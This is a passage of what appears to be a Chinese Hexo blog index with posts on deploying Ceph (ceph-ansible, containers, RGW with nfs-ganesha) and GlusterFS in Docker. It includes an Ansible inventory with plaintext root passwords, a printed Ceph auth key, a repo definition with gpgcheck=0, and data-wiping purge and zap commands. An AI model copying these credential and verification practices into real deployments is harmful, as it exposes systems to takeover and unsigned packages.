<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[mons]</span><br><span class="line">172.30.12.197 ansible_ssh_user=root ansible_ssh_pass=1234\$\#</span><br><span class="line"></span><br><span class="line">[osds]</span><br><span class="line">172.30.12.137 ansible_ssh_user=root ansible_ssh_pass=1234\$\#</span><br><span class="line">172.30.12.197 ansible_ssh_user=root ansible_ssh_pass=1234\$\#</span><br><span class="line">172.30.12.227 ansible_ssh_user=root ansible_ssh_pass=1234\$\#</span><br><span class="line"></span><br><span class="line">[mgrs]</span><br><span class="line">172.30.12.137 ansible_ssh_user=root ansible_ssh_pass=1234\$\#</span><br></pre></td></tr></table></figure>
<p>最后</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ansible-playbook -i &#123;inventory host&#125; add-osd.yml</span><br></pre></td></tr></table></figure>

<h3 id="清除集群部署"><a href="#清除集群部署" class="headerlink" title="清除集群部署"></a>清除集群部署</h3><p>首先</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp ./infrastructure-playbooks/purge-cluster.yml ./purge-cluster.yml</span><br></pre></td></tr></table></figure>
<p>然后</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ansible-playbook -i &#123;inventory host&#125; purge-cluster.yml</span><br></pre></td></tr></table></figure>

<h3 id="Ceph配置文件分发"><a href="#Ceph配置文件分发" class="headerlink" title="Ceph配置文件分发"></a>Ceph配置文件分发</h3><p>配置文件分发各个节点</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ansible all -i dummy-ansible-hosts -m copy -a &quot;src=/root/ceph.conf dest=/etc/ceph/&quot;</span><br></pre></td></tr></table></figure>

<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://lnsyyj.github.io/2018/08/29/ceph-ansible-project/">ceph-ansible project</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>deployment</tag>
      </tags>
  </entry>
  <entry>
    <title>初尝GlusterFS</title>
    <url>/2017/08/03/storage/gluster/gluster-hello-world/</url>
    <content><![CDATA[<p><img src="/images/gluster/glusterfs-antmascot.png" alt="glusterfs-antmascot"></p>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>GlusterFS (Gluster File System) 是一个开源的分布式文件系统，主要由 Z RESEARCH 公司负责开发。GlusterFS 是 Scale-Out 存储解决方案 Gluster 的核心，具有强大的横向扩展能力，通过扩展能够支持数PB存储容量和处理数千客户端。GlusterFS 借助 TCP&#x2F;IP 或 InfiniBand RDMA 网络将物理分布的存储资源聚集在一起，使用单一全局命名空间来管理数据。GlusterFS 基于可堆叠的用户空间设计，可为各种不同的数据负载提供优异的性能。</p>
<p><img src="/images/gluster/glusterfs-frame.png" alt="glusterfs-frame"></p>
<p>GlusterFS 总体架构与组成，它主要由存储服务器（Brick Server）、客户端以及 NFS&#x2F;Samba 存储网关组成。不难发现，GlusterFS 架构中没有元数据服务器组件，这是其最大的设计这点，对于提升整个系统的性能、可靠性和稳定性都有着决定性的意义。</p>
<ul>
<li>GlusterFS 支持 TCP&#x2F;IP 和 InfiniBand RDMA 高速网络互联。</li>
<li>客户端可通过原生 GlusterFS 协议访问数据，其他没有运行 GlusterFS 客户端的终端可通过 NFS&#x2F;CIFS 标准协议通过存储网关访问数据（存储网关提供弹性卷管理和访问代理功能）。</li>
<li>存储服务器主要提供基本的数据存储功能，客户端弥补了没有元数据服务器的问题，承担了更多的功能，包括数据卷管理、I&#x2F;O 调度、文件定位、数据缓存等功能，利用 FUSE（File system in User Space）模块将 GlusterFS 挂载到本地文件系统之上，实现 POSIX 兼容的方式来访问系统数据。</li>
</ul>
<h2 id="卷类型"><a href="#卷类型" class="headerlink" title="卷类型"></a>卷类型</h2><h3 id="Distribute卷"><a href="#Distribute卷" class="headerlink" title="Distribute卷"></a>Distribute卷</h3><p>分布式卷，基于 Hash 算法将文件分布到所有 brick server，只是扩大了磁盘空间，不具备容错能力。由于distribute volume 使用本地文件系统，因此存取效率并没有提高，相反会因为网络通信的原因使用效率有所降低，另外本地存储设备的容量有限制，因此支持超大型文件会有一定难度。</p>
<p><img src="/images/gluster/glusterfs-volume-distribute.jpg" alt="glusterfs-volume-distribute"></p>
<h3 id="Stripe卷"><a href="#Stripe卷" class="headerlink" title="Stripe卷"></a>Stripe卷</h3><p>条带卷，类似 RAID0，文件分成数据块以 Round Robin 方式分布到 brick server 上，并发粒度是数据块，支持超大文件，大文件的读写性能高。</p>
<p><img src="/images/gluster/glusterfs-volume-stripe.jpg" alt="glusterfs-volume-stripe"></p>
<h3 id="Replica卷"><a href="#Replica卷" class="headerlink" title="Replica卷"></a>Replica卷</h3><p>复制卷，文件同步复制到多个 brick 上，文件级 RAID1，具有容错能力，写性能下降，读性能提升。Replicated 模式，也称作 AFR（Auto File Replication），相当于 RAID1，即同一文件在多个镜像存储节点上保存多份，每个 replicated 子节点有着相同的目录结构和文件，replica volume 也是在容器存储中较为推崇的一种。</p>
<p><img src="/images/gluster/glusterfs-volume-replica.jpg" alt="glusterfs-volume-replica"></p>
<h3 id="Distribute-Stripe卷"><a href="#Distribute-Stripe卷" class="headerlink" title="Distribute Stripe卷"></a>Distribute Stripe卷</h3><p>分布式条带卷，Brick server 数量是条带数的倍数，兼具 distribute 和 stripe 卷的特点。分布式的条带卷，volume 中 brick 所包含的存储服务器数必须是 stripe 的倍数(&gt;&#x3D;2倍)，兼顾分布式和条带式的功能。每个文件分布在四台共享服务器上，通常用于大文件访问处理，最少需要 4 台服务器才能创建分布条带卷。</p>
<p><img src="/images/gluster/glusterfs-volume-distribute-stripe.jpg" alt="glusterfs-volume-distribute-stripe"></p>
<h3 id="Distribute-Replica卷"><a href="#Distribute-Replica卷" class="headerlink" title="Distribute Replica卷"></a>Distribute Replica卷</h3><p>分布式复制卷，Brick server 数量是镜像数的倍数，兼具 distribute 和 replica 卷的特点,可以在 2 个或多个节点之间复制数据。分布式的复制卷，volume 中 brick 所包含的存储服务器数必须是 replica 的倍数(&gt;&#x3D;2倍)，兼顾分布式和复制式的功能。</p>
<p><img src="/images/gluster/glusterfs-volume-distribute-replica.jpg" alt="glusterfs-volume-distribute-replica"></p>
<h3 id="Stripe-Replica卷"><a href="#Stripe-Replica卷" class="headerlink" title="Stripe Replica卷"></a>Stripe Replica卷</h3><p>条带复制卷，类似 RAID 10，同时具有条带卷和复制卷的特点。</p>
<p><img src="/images/gluster/glusterfs-volume-stripe-replica.png" alt="glusterfs-volume-stripe-replica"></p>
<h3 id="Distribute-Stripe-Replica卷"><a href="#Distribute-Stripe-Replica卷" class="headerlink" title="Distribute Stripe Replica卷"></a>Distribute Stripe Replica卷</h3><p>分布式条带复制卷，三种基本卷的复合卷，通常用于类 Map Reduce 应用。</p>
<p><img src="/images/gluster/glusterfs-volume-distribute-stripe-replica.png" alt="glusterfs-volume-distribute-stripe-replica"></p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>使用docker部署GlusterFS，dockerfile如下：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7.3</span>.<span class="number">1611</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">MAINTAINER</span> zhoub</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> yum update -y</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> yum install -y centos-release-gluster310.noarch</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> yum update -y</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> yum clean all</span></span><br></pre></td></tr></table></figure>

<p>创建GlusterFS镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker build -t glusterfs:3.10 -f ./dockerfile .</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>创建docker容器脚本<code>mkgfs.sh</code>，创建两个容器，用来组件gluster集群</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">count=2</span><br><span class="line">image=glusterfs:3.10</span><br><span class="line"></span><br><span class="line">for((i=1;i&lt;=$count;i++))</span><br><span class="line">do</span><br><span class="line">    docker run -d -e &quot;container=docker&quot; --privileged=true -v /sys/fs/cgroup:/sys/fs/cgroup -h glf-client-$i --name glf_client_$i $&#123;image&#125; /usr/sbin/init</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h1 id="部署-使用"><a href="#部署-使用" class="headerlink" title="部署&amp;使用"></a>部署&amp;使用</h1><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>安装<code>glusterfs-server</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">yum install -y glusterfs-server</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>准备数据目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">mkdir</span> -p /brks/brk1/gv0</span></span><br></pre></td></tr></table></figure>
<p>(此处不进行数据盘挂载，直接使用系统硬盘)</p>
<p>启动<code>glusterd</code>服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">systemctl <span class="built_in">enable</span> glusterd</span></span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">systemctl start glusterd</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">systemctl status glusterd</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>在容器<code>glf-client-1</code>上添加<code>glf-client-2</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gluster peer probe glf-client-2</span><br></pre></td></tr></table></figure>
<p>(此处省去向<code>/etc/hosts</code>增加ip、域名的映射修改)</p>
<p>在容器<code>glf-client-2</code>上添加<code>glf-client-1</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gluster peer probe glf-client-1</span><br></pre></td></tr></table></figure>
<p>(此处省去向<code>/etc/hosts</code>增加ip、域名的映射修改)</p>
<p>在任意一个容器上创建、启动volume</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">gluster volume create gv0 replica 2 glf-client-1:/brks/brk1/gv0 glf-client-2:/brks/brk1/gv0 force</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">gluster volume start gv0</span></span><br></pre></td></tr></table></figure>
<p>(由于gv0使用的是系统盘，所以在volume创建时，需要指定<code>force</code>参数)<br>创建、启动完volume后可通过<code>gluster volume info</code>和<code>gluster volume status gv0</code>查看状态。</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mount -t glusterfs glf-client-1:gv0 /mnt/</span><br></pre></td></tr></table></figure>

<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://wiki.centos.org/SpecialInterestGroup/Storage/gluster-Quickstart">gluster-Quickstart</a></li>
<li><a href="http://blog.csdn.net/luckytanggu/article/details/71514798">容器中使用systemctl命令重启服务</a></li>
<li><a href="https://www.ibm.com/developerworks/cn/opensource/os-cn-glusterfs-docker-volume/index.html?lnk=hm">基于 GlusterFS 实现 Docker 集群的分布式存储</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>gluster</tag>
      </tags>
  </entry>
  <entry>
    <title>ceph-container构建</title>
    <url>/2019/12/12/storage/ceph/ceph-container-build/</url>
    <content><![CDATA[<p>使用官方<code>ceph-container</code>工程构建私人定制的<code>ceph/daemon</code>镜像。本文以mimic版本为例，在对mimic进行二次开发后，将生成的rpm包更新到yum源中，再生成新的<code>ceph-release</code>中使用该yum源。</p>
<h1 id="获取官方ceph-container"><a href="#获取官方ceph-container" class="headerlink" title="获取官方ceph-container"></a>获取官方ceph-container</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone git@github.com:ceph/ceph-container.git</span><br></pre></td></tr></table></figure>

<h1 id="安装私有Ceph-repo"><a href="#安装私有Ceph-repo" class="headerlink" title="安装私有Ceph.repo"></a>安装私有Ceph.repo</h1><p>修改获取<code>ceph-release</code>RPM包地址，编辑文件<code>./ceph-releases/ALL/centos/daemon-base/__DOCKERFILE_INSTALL__</code>。</p>
<p>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y epel-release &amp;&amp; \</span><br><span class="line">yum install -y jq &amp;&amp; \</span><br><span class="line">bash -c &#x27; \</span><br><span class="line">  if [ -n &quot;__GANESHA_PACKAGES__&quot; ]; then \</span><br><span class="line">    echo &quot;[ganesha]&quot; &gt; /etc/yum.repos.d/ganesha.repo ; \</span><br><span class="line">    echo &quot;name=ganesha&quot; &gt;&gt; /etc/yum.repos.d/ganesha.repo ; \</span><br><span class="line">    if [[ &quot;$&#123;CEPH_VERSION&#125;&quot; =~ master|^wip* ]]; then \</span><br><span class="line">      REPO_URL=$(curl -s &quot;https://shaman.ceph.com/api/search/?project=nfs-ganesha&amp;distros=centos/__ENV_[BASEOS_TAG]__&amp;flavor=ceph_master&amp;ref=next&amp;sha1=latest&quot; | jq -a &quot;.[0] | .url&quot;); \</span><br><span class="line">      echo &quot;baseurl=$REPO_URL/\$basearch/&quot; &gt;&gt; /etc/yum.repos.d/ganesha.repo ; \</span><br><span class="line">    elif [[ &quot;$&#123;CEPH_VERSION&#125;&quot; == nautilus ]]; then \</span><br><span class="line">      echo &quot;baseurl=http://download.ceph.com/nfs-ganesha/rpm-V2.8-stable/$CEPH_VERSION/\$basearch/&quot; &gt;&gt; /etc/yum.repos.d/ganesha.repo ; \</span><br><span class="line">    else \</span><br><span class="line">      echo &quot;baseurl=http://download.ceph.com/nfs-ganesha/rpm-V2.7-stable/$CEPH_VERSION/\$basearch/&quot; &gt;&gt; /etc/yum.repos.d/ganesha.repo ; \</span><br><span class="line">    fi ; \</span><br><span class="line">    echo &quot;gpgcheck=0&quot; &gt;&gt; /etc/yum.repos.d/ganesha.repo ; \</span><br><span class="line">    echo &quot;enabled=1&quot; &gt;&gt; /etc/yum.repos.d/ganesha.repo  ; \</span><br><span class="line">  fi ; \</span><br><span class="line">  if [ -n &quot;__ISCSI_PACKAGES__&quot; ]; then \</span><br><span class="line">    for repo in tcmu-runner python-rtslib; do \</span><br><span class="line">      curl -s -L https://shaman.ceph.com/api/repos/$repo/master/latest/__ENV_[BASEOS_REPO]__/__ENV_[BASEOS_TAG]__/repo &gt; /etc/yum.repos.d/$repo.repo ; \</span><br><span class="line">    done ; \</span><br><span class="line">    if [[ &quot;$&#123;CEPH_VERSION&#125;&quot; =~ master|^wip* ]]; then \</span><br><span class="line">      curl -s -L https://shaman.ceph.com/api/repos/ceph-iscsi/master/latest/__ENV_[BASEOS_REPO]__/__ENV_[BASEOS_TAG]__/repo &gt; /etc/yum.repos.d/ceph-iscsi.repo ; \</span><br><span class="line">    elif [[ &quot;$&#123;CEPH_VERSION&#125;&quot; == nautilus ]]; then \</span><br><span class="line">      curl -s -L https://download.ceph.com/ceph-iscsi/3/rpm/el__ENV_[BASEOS_TAG]__/ceph-iscsi.repo -o /etc/yum.repos.d/ceph-iscsi.repo ; \</span><br><span class="line">    else \</span><br><span class="line">      curl -s -L https://download.ceph.com/ceph-iscsi/2/rpm/el__ENV_[BASEOS_TAG]__/ceph-iscsi.repo -o /etc/yum.repos.d/ceph-iscsi.repo ; \</span><br><span class="line">    fi ; \</span><br><span class="line">  fi&#x27; &amp;&amp; \</span><br><span class="line">yum update -y &amp;&amp; \</span><br><span class="line">rpm --import &#x27;https://download.ceph.com/keys/release.asc&#x27; &amp;&amp; \</span><br><span class="line">bash -c &#x27; \</span><br><span class="line">  if [[ &quot;$&#123;CEPH_VERSION&#125;&quot; =~ master|^wip* ]] || $&#123;CEPH_DEVEL&#125;; then \</span><br><span class="line">    REPO_URL=$(curl -s &quot;https://shaman.ceph.com/api/search/?project=ceph&amp;distros=centos/__ENV_[BASEOS_TAG]__&amp;flavor=default&amp;ref=$&#123;CEPH_VERSION&#125;&amp;sha1=latest&quot; | jq -a &quot;.[0] | .url&quot;); \</span><br><span class="line">    RELEASE_VER=0 ;\</span><br><span class="line">  else \</span><br><span class="line">    RELEASE_VER=1 ;\</span><br><span class="line">    REPO_URL=&quot;http://10.100.13.112/rpm-$&#123;CEPH_VERSION&#125;/el__ENV_[BASEOS_TAG]__/&quot;; \</span><br><span class="line">  fi &amp;&amp; \</span><br><span class="line">  rpm -Uvh &quot;$REPO_URL/noarch/ceph-release-1-$&#123;RELEASE_VER&#125;.el__ENV_[BASEOS_TAG]__.noarch.rpm&quot; &#x27; &amp;&amp; \</span><br><span class="line">yum install -y __CEPH_BASE_PACKAGES__ &amp;&amp; \</span><br><span class="line">bash -c &#x27; \</span><br><span class="line">  if [[ &quot;$&#123;CEPH_VERSION&#125;&quot; =~ master|^wip* ]] || $&#123;CEPH_DEVEL&#125;; then \</span><br><span class="line">    yum install -y python-pip ; \</span><br><span class="line">    pip install -U remoto ; \</span><br><span class="line">    yum remove -y python-pip ; \</span><br><span class="line">  fi &#x27;</span><br></pre></td></tr></table></figure>
<p><code>REPO_URL</code>使用您指定的yum源。</p>
<h1 id="指定版本构建镜像"><a href="#指定版本构建镜像" class="headerlink" title="指定版本构建镜像"></a>指定版本构建镜像</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make FLAVORS=mimic-13.2.6-1.gba13b2d.el7,centos,7 build</span><br></pre></td></tr></table></figure>

<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://github.com/ceph/ceph-container">ceph-container</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
      </tags>
  </entry>
  <entry>
    <title>Ceph容器部署</title>
    <url>/2019/09/23/storage/ceph/ceph-deploy-indocker/</url>
    <content><![CDATA[<p>容器化、容器化、容器化。。。都说重要的事情说三遍，那么Ceph部署有必要容器化吗？</p>
<p>有必要，非常有必要。容器化以后，不仅不会损失性能，而且对以后更新、回退都很方便。而且一个物理机（或虚拟机）上可以跑多个Ceph集群。对于一个开发人员，修改调试都实在是太方便了～～～～～！</p>
<p>闲言碎语不要讲，先拉个集群起来看看吧。</p>
<h1 id="mimic"><a href="#mimic" class="headerlink" title="mimic"></a>mimic</h1><h2 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h2><p><a href="https://hub.docker.com/r/ceph/daemon"><code>ceph/daemon:latest-mimic</code></a></p>
<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><p>使用docker bridge网络，每个容器指定静态IP。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker network create --subnet 192.168.44.0/24 cephnet</span><br></pre></td></tr></table></figure>

<h2 id="拉起Ceph集群"><a href="#拉起Ceph集群" class="headerlink" title="拉起Ceph集群"></a>拉起Ceph集群</h2><h3 id="MON"><a href="#MON" class="headerlink" title="MON"></a>MON</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --net cephnet --ip 192.168.44.11 -v /Users/zhoub/temp/etc_ceph/:/etc/ceph -v /Users/zhoub/temp/var_lib_ceph/:/var/lib/ceph -e MON_IP=192.168.44.11 -e CEPH_PUBLIC_NETWORK=192.168.44.0/24 --name mon --hostname mon  ceph/daemon:latest-mimic mon</span><br></pre></td></tr></table></figure>

<h3 id="MGR"><a href="#MGR" class="headerlink" title="MGR"></a>MGR</h3><p>MGR节点很重要，如果没有MGR节点，你就看不到OSD的使用量了。现在的MON真是翻身农奴把歌唱啊，一心只做心跳了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --net cephnet --ip 192.168.44.12 -v /Users/zhoub/temp/etc_ceph/:/etc/ceph -v /Users/zhoub/temp/var_lib_ceph/:/var/lib/ceph --name mgr --hostname mgr ceph/daemon:latest-mimic mgr</span><br></pre></td></tr></table></figure>

<h3 id="OSD"><a href="#OSD" class="headerlink" title="OSD"></a>OSD</h3><p>OSD有两种部署方式，一种是将硬盘部署；另一种是目录部署。由于本人使用mac版本docker，所以在映射硬盘过程不太方便，所以使用目录部署。后面会给出硬盘部署的方式。</p>
<h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --net cephnet --ip 192.168.44.13 -v /Users/zhoub/temp/etc_ceph/:/etc/ceph -v /Users/zhoub/temp/var_lib_ceph/:/var/lib/ceph --name osd --hostname osd -e OSD_TYPE=directory ceph/daemon:latest-mimic osd</span><br></pre></td></tr></table></figure>

<p>由于mac上的docker是运行在一个虚拟机中的，目前不太清楚该虚拟机使用的文件系统是什么，所以osd会暴如下错误：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker logs -f osd</span></span><br><span class="line">2019-09-23 10:59:14  /opt/ceph-container/bin/entrypoint.sh: static: does not generate config</span><br><span class="line">2019-09-23 10:59:14  /opt/ceph-container/bin/entrypoint.sh: Creating osd</span><br><span class="line">2019-09-23 10:59:14  /opt/ceph-container/bin/entrypoint.sh: OSD created with ID: 0</span><br><span class="line">2019-09-23 10:59:14  /opt/ceph-container/bin/entrypoint.sh: created folder /var/lib/ceph/osd/ceph-0/</span><br><span class="line">creating /var/lib/ceph/osd/ceph-0//keyring</span><br><span class="line">added entity osd.0 auth auth(auid = 18446744073709551615 key=AQCCpYhdbE1EGxAAxX2Av3Gzez/5j8sijQg1jQ== with 0 caps)</span><br><span class="line">2019-09-23 10:59:15.014 7f255136fd80 -1 filestore(/var/lib/ceph/osd/ceph-0) WARNING: max attr value size (1024) is smaller than osd_max_object_name_len (2048).  Your backend filesystem appears to not support attrs large enough to handle the configured max rados name size.  You may get unexpected ENAMETOOLONG errors on rados operations or buggy behavior</span><br><span class="line">2019-09-23 10:59:15.084 7f255136fd80 -1 filestore(/var/lib/ceph/osd/ceph-0) mkjournal(1101): error creating journal on /var/lib/ceph/osd/ceph-0//journal: (22) Invalid argument</span><br><span class="line">2019-09-23 10:59:15.084 7f255136fd80 -1 OSD::mkfs: ObjectStore::mkfs failed with error (22) Invalid argument</span><br><span class="line">2019-09-23 10:59:15.084 7f255136fd80 -1  ** ERROR: error creating empty object store in /var/lib/ceph/osd/ceph-0: (22) Invalid argument</span><br></pre></td></tr></table></figure>

<h4 id="硬盘"><a href="#硬盘" class="headerlink" title="硬盘"></a>硬盘</h4><p>在硬盘部署以前，需要先对硬盘进行格式化</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --privileged=true --rm -v /dev/:/dev/ -e OSD_DEVICE=/dev/sdb ceph/daemon:latest-mimic zap_device</span><br></pre></td></tr></table></figure>

<p>格式化后再启动容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --net cephnet --ip 192.168.44.13 --hostname osd --name=osd --privileged  -v /Users/zhoub/temp/etc_ceph/:/etc/ceph -v /Users/zhoub/temp/var_lib_ceph/:/var/lib/ceph -v /dev/:/dev/ -e OSD_DEVICE=/dev/sdb ceph/daemon:latest-mimic osd</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>集群除OSD服务外其它服务均可以正常容器化</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@mon /]# ceph -s</span><br><span class="line">  cluster:</span><br><span class="line">    id:     61a4f9d8-fdc7-4883-8b71-7f93c2017f86</span><br><span class="line">    health: HEALTH_OK</span><br><span class="line"></span><br><span class="line">  services:</span><br><span class="line">    mon: 1 daemons, quorum mon</span><br><span class="line">    mgr: mgr(active)</span><br><span class="line">    osd: 1 osds: 0 up, 0 in</span><br><span class="line"></span><br><span class="line">  data:</span><br><span class="line">    pools:   0 pools, 0 pgs</span><br><span class="line">    objects: 0  objects, 0 B</span><br><span class="line">    usage:   0 B used, 0 B / 0 B avail</span><br><span class="line">    pgs:</span><br></pre></td></tr></table></figure>
<p>OSD目录部署不能正常提供服务主要是因为宿主机的文件系统类型未知，若宿主机可正常登录操作，此问题可解；<br>OSD硬盘部署不能正常提供服务主要是因为宿主机不能增加硬盘设备，若宿主机可以添加硬盘，此问题可解。</p>
<p>综上所述，问题根本在于对宿主机的操作了解不够清晰。</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://www.jianshu.com/p/ff3be28a1015">使用Docker快速部署Ceph集群</a></li>
<li><a href="https://hub.docker.com/r/ceph/daemon">ceph&#x2F;daemon</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Ceph提供NFS服务 —— RGW＋nfs-ganesha</title>
    <url>/2017/05/25/storage/ceph/ceph-nfs-service-by-rgw-with-nfs-ganesha/</url>
    <content><![CDATA[<p><img src="/images/ceph/nfs-ganesha.jpg" alt="nfs-ganesha.jpg"></p>
<p>Ceph是统一存储，包括块、文件、对象。其中块存储必须映射给linux内核，然后才能用，而内核客户端代码的更新收到了linus的限制，已经好久没更新了。librbd又不能直接用，不过道是可以用nbd映射一下使用。cephfs目前还不太适合生产环境。目前<code>*nix</code>对nfs的支持还是很全面的，而对librbd、cephfs的支持就是大不一样了。so，使ceph支持nfs协议很有意义了，but！ceph是分布式存储，被ganesha一搞，出现了单节点问题，所以只能想办法从HA角度解决了，这也是一种无奈，唉。。。</p>
<p>（～～一丝光～～）从nfs v4.1开始支持并行存储，这或许是一缕新曙光。</p>
<h1 id="NFS-Ganesha架构"><a href="#NFS-Ganesha架构" class="headerlink" title="NFS-Ganesha架构"></a>NFS-Ganesha架构</h1><p><img src="/images/ceph/ceph-nfs-service-by-rgw-with-nfs-ganesha.png" alt="ceph-nfs-service-by-rgw-with-nfs-ganesha.png"></p>
<h1 id="实施"><a href="#实施" class="headerlink" title="实施"></a>实施</h1><h2 id="RGW搭建"><a href="#RGW搭建" class="headerlink" title="RGW搭建"></a>RGW搭建</h2><p>关于RGW的安装搭建请于<a href="http://www.ceph.com/">Ceph官网</a>查看</p>
<h4 id="用户创建"><a href="#用户创建" class="headerlink" title="用户创建"></a>用户创建</h4><p>创建一个S3用户专门服务于nfs-ganesha</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> radosgw-admin --uid=nfs_ganesha_user --display=<span class="string">&quot;User for NFS-Ganesha&quot;</span></span></span><br><span class="line">&#123;</span><br><span class="line">    &quot;user_id&quot;: &quot;nfs_ganesha_user&quot;,</span><br><span class="line">    &quot;display_name&quot;: &quot;User for NFS-Ganesha&quot;,</span><br><span class="line">    &quot;email&quot;: &quot;&quot;,</span><br><span class="line">    &quot;suspended&quot;: 0,</span><br><span class="line">    &quot;max_buckets&quot;: 1000,</span><br><span class="line">    &quot;auid&quot;: 0,</span><br><span class="line">    &quot;subusers&quot;: [],</span><br><span class="line">    &quot;keys&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;user&quot;: &quot;nfs_ganesha_user&quot;,</span><br><span class="line">            &quot;access_key&quot;: &quot;xxxxxxxxxxxxxxxxxxxx&quot;,</span><br><span class="line">            &quot;secret_key&quot;: &quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;swift_keys&quot;: [],</span><br><span class="line">    &quot;caps&quot;: [],</span><br><span class="line">    &quot;op_mask&quot;: &quot;read, write, delete&quot;,</span><br><span class="line">    &quot;default_placement&quot;: &quot;&quot;,</span><br><span class="line">    &quot;placement_tags&quot;: [],</span><br><span class="line">    &quot;bucket_quota&quot;: &#123;</span><br><span class="line">        &quot;enabled&quot;: false,</span><br><span class="line">        &quot;max_size_kb&quot;: -1,</span><br><span class="line">        &quot;max_objects&quot;: -1</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;user_quota&quot;: &#123;</span><br><span class="line">        &quot;enabled&quot;: false,</span><br><span class="line">        &quot;max_size_kb&quot;: -1,</span><br><span class="line">        &quot;max_objects&quot;: -1</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;temp_url_keys&quot;: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>user</code>、<code>access_key</code>、<code>secret_key</code>是后续nfs-ganesha配置是需要使用到的。</p>
